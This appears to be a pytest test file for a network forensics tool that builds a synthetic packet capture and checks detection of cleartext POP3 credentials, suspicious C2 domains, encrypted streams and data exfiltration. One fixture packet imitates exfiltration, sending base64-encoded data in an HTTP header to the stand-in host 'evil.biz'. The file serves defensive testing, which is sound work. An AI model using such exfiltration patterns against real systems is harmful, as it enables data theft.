"""Tests for the pcap forensics module (aesop.network.pcap)."""
from __future__ import annotations

import base64
import os

import pytest

scapy = pytest.importorskip("scapy")
from scapy.all import Ether, IP, TCP, UDP, Raw, wrpcap  # noqa: E402
from scapy.layers.dns import DNS, DNSQR, DNSRR  # noqa: E402

from aesop.network.pcap import (  # noqa: E402
    analyze_pcap, _is_private, _levenshtein, _registrable,
)


def _build_pcap(path: str) -> None:
    pkts = []
    flag = b"flag{pcap_triage_ok}"
    b64flag = base64.b64encode(flag)  # cleartext base64 blob on the wire

    # 1) Internal -> external HTTP carrying a base64 flag (exfil + decodable)
    pkts.append(Ether() / IP(src="10.0.0.5", dst="203.0.113.200") /
                TCP(sport=44444, dport=80, flags="S"))
    pkts.append(Ether() / IP(src="10.0.0.5", dst="203.0.113.200") /
                TCP(sport=44444, dport=80, flags="PA") /
                Raw(load=b"GET /x HTTP/1.1\r\nHost: evil.biz\r\nX-Data: " + b64flag + b"\r\n\r\n"))

    # 2) POP3 cleartext credentials
    pkts.append(Ether() / IP(src="10.0.0.9", dst="10.0.0.41") /
                TCP(sport=51000, dport=110, flags="PA") /
                Raw(load=b"USER agent\r\nPASS s3cr3t\r\n"))

    # 3) DNS query to a suspicious .biz domain, with an answer
    pkts.append(Ether() / IP(src="10.0.0.5", dst="10.0.0.53") /
                UDP(sport=5300, dport=53) /
                DNS(qd=DNSQR(qname="unlockmyfiles.biz")))
    pkts.append(Ether() / IP(src="10.0.0.53", dst="10.0.0.5") /
                UDP(sport=53, dport=5300) /
                DNS(qr=1, qd=DNSQR(qname="unlockmyfiles.biz"),
                    an=DNSRR(rrname="unlockmyfiles.biz", type="A", rdata="198.51.100.66")))

    # 4) High-entropy (encrypted) stream: many pseudo-random bytes to external host
    blob = bytes((i * 167 + 13) % 256 for i in range(2048))
    pkts.append(Ether() / IP(src="10.0.0.9", dst="203.0.113.200") /
                TCP(sport=55555, dport=21763, flags="PA") / Raw(load=blob))

    wrpcap(path, pkts)


def test_helpers():
    assert _is_private("10.21.40.5") is True
    assert _is_private("192.168.1.1") is True
    assert _is_private("203.0.113.200") is False   # RFC5737 doc range == external
    assert _is_private("198.51.100.66") is False
    assert _levenshtein("print01", "prnt01") == 1
    assert _registrable("files.wexford.army.internal") == "army.internal"


def test_full_analysis(tmp_path):
    p = str(tmp_path / "t.pcap")
    _build_pcap(p)
    rep = analyze_pcap(p)

    # credentials
    creds = " ".join(c for _, c, _ in rep.credentials)
    assert "agent:s3cr3t" in creds

    # flag recovered (either found directly or decoded from base64)
    assert any("flag{pcap_triage_ok}" in f for f in rep.flags)

    # suspicious domain finding
    kinds = {f.kind for f in rep.findings}
    assert "c2" in kinds        # unlockmyfiles.biz suspicious TLD
    assert "exfil" in kinds     # external traffic
    assert "crypto" in kinds    # high-entropy stream

    # requirements always produced
    assert rep.requirements


def test_dns_map(tmp_path):
    p = str(tmp_path / "t.pcap")
    _build_pcap(p)
    rep = analyze_pcap(p)
    assert rep.dns_map.get("unlockmyfiles.biz") == "198.51.100.66"


def test_external_classification(tmp_path):
    p = str(tmp_path / "t.pcap")
    _build_pcap(p)
    rep = analyze_pcap(p)
    ext = [c for c in rep.conversations if c.external]
    assert any(c.a == "203.0.113.200" or c.b == "203.0.113.200" for c in ext)
